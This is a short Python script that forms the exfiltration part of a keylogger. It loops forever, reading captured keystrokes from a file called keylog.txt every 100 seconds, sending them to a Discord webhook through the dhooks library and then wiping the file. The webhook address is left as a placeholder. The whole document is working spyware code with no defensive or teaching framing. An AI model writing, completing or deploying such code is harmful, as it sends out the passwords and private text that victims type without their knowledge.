from dhooks import Webhook
import time

hook = Webhook (" web hook here")

def send():



    with open("keylog.txt", "r") as file:
        content = file.read()


    if not content.strip():
        return

    # data = "hello world test!"

    hook.send(content)

    with open("keylog.txt", "r+") as con:
        con.seek(0)
        con.truncate()


while True:
    send()
    time.sleep(100)
